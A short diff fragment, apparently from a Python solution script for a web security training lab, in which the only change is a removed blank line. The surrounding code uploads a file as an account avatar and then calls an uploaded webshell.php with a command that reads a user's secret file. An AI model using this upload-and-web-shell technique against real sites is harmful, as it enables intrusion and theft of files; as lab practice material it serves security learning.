@@ -39,7 +39,6 @@ def upload_file():
    requests.post(f"{lab_url}/my-account/avatar", cookies={"session": cookie}, files=file, data=data)
 
 
-
 def execute_command():
     response = requests.get(f"{lab_url}/files/avatars/webshell.php?cmd=cat%20/home/carlos/secret", cookies={"session": cookie})
     print(response.text)
